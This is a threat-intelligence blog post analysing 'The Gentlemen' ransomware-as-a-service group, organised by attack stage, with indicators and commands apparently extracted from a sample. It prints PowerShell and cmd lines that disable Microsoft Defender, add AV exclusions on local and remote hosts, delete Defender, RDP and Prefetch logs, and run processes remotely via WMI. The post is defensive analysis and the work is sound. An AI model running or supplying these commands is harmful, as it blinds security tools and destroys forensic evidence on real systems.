---
title: "Threats Intelligence 01: The Gentlemen Ransomware"
date: 2026-02-20 18:00:00 +0200
categories:
  - Threats Intelligences
tags:
  - threat-intelligence
  - ransomware
  - mitre-attack
  - malware-analysis
summary: "The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in July-August 2025, quickly establishing itself as a major global cyber threat. The group operates under a Ransomware-as-a-Service (RaaS) model, offering affiliates a customizable, cross-platform toolkit targeting different environments."
description: "Detailed breakdown of The Gentlemen ransomware operational commands and references extracted from hapvida.exe."
image:
  path: /assets/img/the-gentlemen-ransomware/gentlemen-cover.webp
  alt: The Gentlemen Ransomware
---

# The Gentlemen Ransomware

The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in July-August 2025, quickly establishing itself as a major global cyber threat. The group operates under a Ransomware-as-a-Service (RaaS) model, offering affiliates a customizable, cross-platform toolkit targeting different environments.

## Key Tactics and Techniques

The Ransomware attack chain. Source - Trend Micro

## Initial Access

- Exploitation of internet-facing services
- Abuse of compromised FortiGate administrative accounts

### C2 & Contact Reference

Email : `negotiation_hapvida@proton.me`

TOX : `ID88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A`

TOX Download : `https://tox.chat/download.html`

Leak Site (Tor) : `http://.onion/`

Tor Browser : `https://www.torproject.org/download/`

## Reconnaissance & Discovery

Network scanning with Advanced IP Scanner and Nmap

```powershell
Get-NetFirewallRule -DisplayGroup "Network Discovery" | Enable-NetFirewallRule
```

Enumerates all local drives and Windows Failover Cluster Shared Volumes (CSV) for encryption targeting.

```powershell
$volumes = @()
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
try {
    $volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
} catch {}
$volumes
```

### System Information Display

```powershell
Write-Host "Windows version <version>" -BackgroundColor Blue -ForegroundColor White
Write-Host "The Gentlemen" -BackgroundColor DarkGray -ForegroundColor White -NoNewline
```

## Privilege Escalation

Execution of components with elevated privileges to gain full environment control

### Elevated Execution

`/RU SYSTEM`       (schtasks flag - run as SYSTEM)  
`--system`         (ransomware flag - encrypt as SYSTEM user)  
`Win32_Process`    (WMI process creation with elevated context)

### WMI Elevated Process Creation

```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

## Defense Evasion

- Deployment of kernel-level anti-AV utilities
- Configuration of AV/Defender exclusions
- Neutralization of EDR tools
- Disabling Microsoft Defender real-time protection

### Local

```powershell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true;
Add-MpPreference -ExclusionPath 'C:\';
Add-MpPreference -ExclusionPath 'C:\Temp';
Add-MpPreference -ExclusionPath '\<share$>';"
```

### Force

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Force
```

### Remote

```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

Clearing telemetry and Windows event logs

- Delete Windows Defender Support Logs: `del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*`
- Delete RDP Log Files: `del /f /q %SystemRoot%\System32\LogFiles\RDP*\*.*`
- Delete Windows Prefetch: `del /f /q C:\Windows\Prefetch\*.*`

## Lateral Movement & Remote Execution

Use of legitimate admin tools (PsExec, PowerRun, PuTTY) to transfer and execute payloads across systems

### Remote Process Execution via WMI

```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

### Remote Process Execution via Invoke-Command

```powershell
Invoke-Command -ComputerName %s -ScriptBlock { Start-Process "%s" }
```

## Persistence & Propagation

GPO manipulation for domain-wide payload distribution

```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

Use of NETLOGON/SYSVOL shares to deploy password-protected payloads

```text
\share$      (UNC share path reference)
--shares     (ransomware flag: encrypt UNC shares)
NETLOGON     (referenced in LanmanServer parameters context)
```

Abuse of AnyDesk as a persistent encrypted remote access channel

```text
autorun.ini
autorun.inf
```

## Data Collection & Exfiltration

- Staging of sensitive data prior to exfiltration
- Encrypted SFTP exfiltration using WinSCP

### Volume Enumeration

```powershell
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
$volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
```

## Ransomware Deployment & Impact

- Ransomware deployment via NETLOGON using domain admin credential
- File encryption with .7mzhh extension
- Ransom note dropped as README-GENTLEMEN.txt
- Termination of backup, database, and security services (Veeam, SQL, Oracle, SAP, Acronis)
- Deletion of shadow copies, logs, artifacts, and security event data

## Victimology

- Target industries: Manufacturing, construction, healthcare, insurance, others
- Target regions: Asia-Pacific, South America, North America, Middle East, others

Victim distribution by industry, region, and country. Source - Trend Micro

## Technical Analysis

### Execution Arguments

When launched, the ransomware executable provides an extensive help message, showing various options and flags available.
